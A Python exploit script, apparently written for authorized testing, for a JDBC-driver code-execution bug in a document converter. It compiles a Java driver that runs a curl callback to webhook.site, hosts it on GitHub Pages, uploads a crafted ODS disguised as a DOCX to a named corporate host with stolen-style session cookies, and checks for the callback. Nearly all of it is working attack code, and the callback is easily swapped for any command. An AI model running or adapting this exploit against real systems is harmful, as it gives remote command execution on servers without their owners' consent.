#!/usr/bin/env python3
"""Complete callback-only CVE-2026-59265 PoC for the authorized test tenant.

With no arguments it publishes a unique JDBC driver through GitHub Pages,
uploads the trigger ODS, and removes identified target material. The driver
uses ProcessBuilder to run one fixed curl callback command, proving OS process
execution without accepting command input.
"""

import hashlib
import io
import json
import secrets
import subprocess
import tempfile
import time
import zipfile
from pathlib import Path
from urllib.parse import urlsplit
from xml.sax.saxutils import quoteattr

import requests

BASE = "https://askhrcntest.siemens.com.cn"
CALLBACK_URL = "https://webhook.site/54fddee2-c0fc-40f2-bb14-f181d41912d5?marker=ctf"
PAGES_REPO = "https://github.com/oicu0619/oicu0619.github.io.git"
PAGES_SITE = "https://oicu0619.github.io"
PAGES_BRANCH = "master"
PAGES_WORKTREE = Path("/tmp/oicu0619.github.io")
PAGES_WAIT_SECONDS = 180
TARGET_WAIT_SECONDS = 60
PADDING_ROWS = 8_500

SESSION_COOKIES = {
    'access_token': "REPLACE_ME",
    'gateway-chatbot-app': "REPLACE_ME",
    'JSESSIONID': "REPLACE_ME",
    'acw_tc': "REPLACE_ME",
}

CONVERT_UPLOAD = "/base-admin/public/file/v1/kb-material-upload"
STATUS = "/aikn-common-app/api/file/convert/checkTranslateStatus"
LIST = "/admin/public/file/v1/material/list"
DELETE = (
    "/admin/public/file/v1/material/delete/confirm/{}",
    "/base-admin/public/file/v1/material/delete/confirm/{}",
)


def command(*argv):
    return subprocess.run(argv, check=True, text=True, capture_output=True).stdout.strip()


def git(*argv):
    return command("git", "-C", str(PAGES_WORKTREE), *argv)


def pages_worktree():
    if (PAGES_WORKTREE / ".git").is_dir():
        remote = git("remote", "get-url", "origin")
        if remote.rstrip("/") != PAGES_REPO.rstrip("/"):
            raise RuntimeError(f"unexpected git origin: {remote}")
        git("pull", "--ff-only", "origin", PAGES_BRANCH)
    elif PAGES_WORKTREE.exists():
        raise RuntimeError(f"non-git path exists: {PAGES_WORKTREE}")
    else:
        command("git", "clone", "--branch", PAGES_BRANCH, PAGES_REPO, str(PAGES_WORKTREE))
    return PAGES_WORKTREE


def publish_canary():
    root = pages_worktree()
    run_id = secrets.token_hex(8)
    directory = f"aoo-jdbc-canary-{run_id}"
    class_name = f"ReportCanary{run_id}"
    public_base = f"{PAGES_SITE}/{directory}"
    output = root / directory
    output.mkdir()

    java = f"""import java.sql.*;
import java.util.Properties;
import java.util.logging.Logger;
public final class {class_name} implements Driver {{
 static {{
  try {{ new ProcessBuilder("curl", "-fsS", "--max-time", "5",
   "-A", "ctf-processbuilder", {json.dumps(CALLBACK_URL)}).start().waitFor(); }}
  catch(Exception ignored) {{}}
 }}
 public Connection connect(String u,Properties p) {{ return null; }}
 public boolean acceptsURL(String u) {{ return true; }}
 public DriverPropertyInfo[] getPropertyInfo(String u,Properties p) {{ return new DriverPropertyInfo[0]; }}
 public int getMajorVersion() {{ return 1; }} public int getMinorVersion() {{ return 0; }}
 public boolean jdbcCompliant() {{ return false; }}
 public Logger getParentLogger() {{ return Logger.getGlobal(); }}
}}
"""
    source = output / f"{class_name}.java"
    source.write_text(java)
    with tempfile.TemporaryDirectory() as temporary:
        command("javac", "--release", "8", "-d", temporary, str(source))
        with zipfile.ZipFile(output / "canary-driver.jar", "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\r\n\r\n")
            archive.write(Path(temporary) / f"{class_name}.class", f"{class_name}.class")

    content = f"""<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:db="urn:oasis:names:tc:opendocument:xmlns:database:1.0" office:version="1.2"><office:body><office:database><db:data-source><db:connection-data><db:connection-resource xlink:href="jdbc:ctf-canary"/><db:login db:is-password-required="false"/></db:connection-data><db:driver-settings db:java-driver-class="{class_name}" db:java-classpath="jar:{public_base}/canary-driver.jar!/"/><db:application-connection-settings/></db:data-source></office:database></office:body></office:document-content>"""
    settings = """<?xml version="1.0" encoding="UTF-8"?><office:document-settings xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" office:version="1.2"><office:settings/></office:document-settings>"""
    manifest = """<?xml version="1.0" encoding="UTF-8"?><manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2"><manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.database"/><manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/><manifest:file-entry manifest:full-path="settings.xml" manifest:media-type="text/xml"/><manifest:file-entry manifest:full-path="database/properties" manifest:media-type=""/><manifest:file-entry manifest:full-path="database/script" manifest:media-type=""/></manifest:manifest>"""
    with zipfile.ZipFile(output / "canary.odb", "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("mimetype", "application/vnd.oasis.opendocument.database", compress_type=zipfile.ZIP_STORED)
        archive.writestr("content.xml", content)
        archive.writestr("settings.xml", settings)
        archive.writestr("database/properties", "version=1.8.0\n")
        archive.writestr("database/script", "")
        archive.writestr("META-INF/manifest.xml", manifest)
    (output / "README.txt").write_text(
        "CTF canary: ProcessBuilder runs only a fixed curl callback command.\n"
    )

    expected = {
        name: hashlib.sha256((output / name).read_bytes()).hexdigest()
        for name in ("canary.odb", "canary-driver.jar")
    }
    git("add", "--", directory)
    git("commit", "-m", f"Add OpenOffice callback canary {run_id}")
    git("push", "origin", f"HEAD:{PAGES_BRANCH}")
    commit = git("rev-parse", "--short", "HEAD")
    print(f"[+] published {public_base} at {commit}")

    deadline = time.monotonic() + PAGES_WAIT_SECONDS
    while time.monotonic() < deadline:
        ready = True
        for name, digest in expected.items():
            try:
                response = requests.get(
                    f"{public_base}/{name}", headers={"Cache-Control": "no-cache"}, timeout=20
                )
                ready &= response.status_code == 200 and hashlib.sha256(response.content).hexdigest() == digest
            except requests.RequestException:
                ready = False
        if ready:
            print("[+] GitHub Pages artifacts are byte-identical")
            return public_base, run_id
        time.sleep(4)
    raise RuntimeError("GitHub Pages did not publish the expected artifacts in time")


def ods_payload(odb_url):
    cell = '<table:table-cell office:value-type="string"><text:p>safe padding</text:p></table:table-cell>'
    padding = (f"<table:table-row>{cell * 4}</table:table-row>") * PADDING_ROWS
    content = f"""<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" office:version="1.2"><office:scripts/><office:font-face-decls/><office:automatic-styles><style:style style:name="ta1" style:family="table"><style:table-properties table:display="true"/></style:style></office:automatic-styles><office:body><office:spreadsheet><table:table table:name="Sheet1" table:style-name="ta1"><table:table-column table:number-columns-repeated="4"/><table:table-row><table:table-cell office:value-type="string"><text:p>JDBC canary</text:p></table:table-cell></table:table-row><table:table-row table:number-rows-repeated="12"><table:table-cell table:number-columns-repeated="4"/></table:table-row>{padding}</table:table><table:named-expressions/><table:database-ranges><table:database-range table:name="Import1" table:target-range-address="Sheet1.A3:Sheet1.B8" table:contains-header="false" table:refresh-delay="PT1S"><table:database-source-sql table:database-name={quoteattr(odb_url)} table:sql-statement="SELECT 1"/></table:database-range></table:database-ranges></office:spreadsheet></office:body></office:document-content>"""
    styles = """<?xml version="1.0" encoding="UTF-8"?><office:document-styles xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:style="urn:oasis:names:tc:opendocument:xmlns:style:1.0" xmlns:fo="urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0" office:version="1.2"><office:styles><style:default-style style:family="table-cell"><style:text-properties fo:font-size="10pt"/></style:default-style></office:styles><office:automatic-styles/><office:master-styles/></office:document-styles>"""
    settings = """<?xml version="1.0" encoding="UTF-8"?><office:document-settings xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" office:version="1.2"><office:settings/></office:document-settings>"""
    manifest = """<?xml version="1.0" encoding="UTF-8"?><manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.2"><manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.spreadsheet"/><manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/><manifest:file-entry manifest:full-path="styles.xml" manifest:media-type="text/xml"/><manifest:file-entry manifest:full-path="settings.xml" manifest:media-type="text/xml"/></manifest:manifest>"""
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("mimetype", "application/vnd.oasis.opendocument.spreadsheet", compress_type=zipfile.ZIP_STORED)
        archive.writestr("content.xml", content)
        archive.writestr("styles.xml", styles)
        archive.writestr("settings.xml", settings)
        archive.writestr("META-INF/manifest.xml", manifest)
    return output.getvalue()


def target_session():
    client = requests.Session()
    client.headers.update({
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/plain, */*",
        "Origin": BASE,
        "Referer": BASE + "/webadmin/",
    })
    client.cookies.update(SESSION_COOKIES)
    return client


def json_body(response):
    response.raise_for_status()
    return response.json()


def require_login(client):
    body = json_body(client.post(BASE + LIST, json={
        "pageNum": 1, "pageSize": 1,
        "data": {"name": "ctf-session-check-never", "type": 0},
    }, timeout=20))
    if body.get("success") is not True:
        raise RuntimeError(f"target session invalid: {body.get('message') or body.get('code')}")


def identifiers(value):
    found = set()
    if isinstance(value, dict):
        for key, child in value.items():
            if key.lower() in {"id", "materialid", "newmaterialid"} and str(child).isdigit():
                found.add(str(child))
            found |= identifiers(child)
    elif isinstance(value, list):
        for child in value:
            found |= identifiers(child)
    return found


def listed_ids(client, prefix):
    found = set()
    for kind in range(5):
        body = json_body(client.post(BASE + LIST, json={
            "pageNum": 1, "pageSize": 1000, "data": {"name": prefix, "type": kind},
        }, timeout=20))
        for row in ((body.get("data") or {}).get("list") or []):
            if str(row.get("name", "")).startswith(prefix):
                found |= identifiers(row)
    return found


def delete_ids(client, values):
    for value in sorted(values, reverse=True):
        for route in DELETE:
            response = client.delete(BASE + route.format(value), json={}, timeout=20)
            try:
                if response.json().get("success") is True:
                    break
            except ValueError:
                pass


def callback_ids():
    parsed = urlsplit(CALLBACK_URL)
    if parsed.hostname != "webhook.site":
        raise RuntimeError("callback verification expects webhook.site")
    response = requests.get(
        f"https://webhook.site/token/{parsed.path.strip('/')}/requests",
        params={"sorting": "newest"}, timeout=20,
    )
    response.raise_for_status()
    return {
        row.get("uuid") for row in response.json().get("data", [])
        if row.get("url") == CALLBACK_URL
    }


def main():
    client = target_session()
    require_login(client)  # Fail before publishing artifacts if cookies expired.
    artifact_base, run_id = publish_canary()
    previous_callbacks = callback_ids()
    prefix = f"ctf-{run_id}-"
    cleanup = set()
    remaining = set()
    try:
        # Upload the generated ODS under a DOCX suffix to reach the converter.
        body = json_body(client.post(
            BASE + CONVERT_UPLOAD,
            files={"file": (
                prefix + "payload.docx", ods_payload(artifact_base + "/canary.odb"),
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            )},
            data={"uploadType": "1", "domainId": "0"}, timeout=60,
        ))
        cleanup |= identifiers(body)
        data = body.get("data") if isinstance(body.get("data"), dict) else body
        material_id = data.get("materialId") or data.get("id")
        if not material_id:
            raise RuntimeError("converter upload returned no material ID")
        print(f"[+] submitted material {material_id}")
        print(f"[*] callback URL: {CALLBACK_URL}")

        deadline = time.monotonic() + TARGET_WAIT_SECONDS
        while time.monotonic() < deadline:
            status = json_body(client.get(BASE + STATUS, params={"id": material_id}, timeout=30))
            cleanup |= identifiers(status)
            time.sleep(1)
    finally:
        cleanup |= listed_ids(client, prefix)
        delete_ids(client, cleanup)
        time.sleep(5)
        late = listed_ids(client, prefix)
        delete_ids(client, late)
        remaining = listed_ids(client, prefix)
        client.close()
        print(f"[*] target cleanup remaining: {len(remaining)}")

    new_callbacks = callback_ids() - previous_callbacks
    print(f"[+] new exact-URL callbacks: {len(new_callbacks)}")
    if not new_callbacks:
        raise SystemExit("no new ProcessBuilder callback observed")


if __name__ == "__main__":
    main()
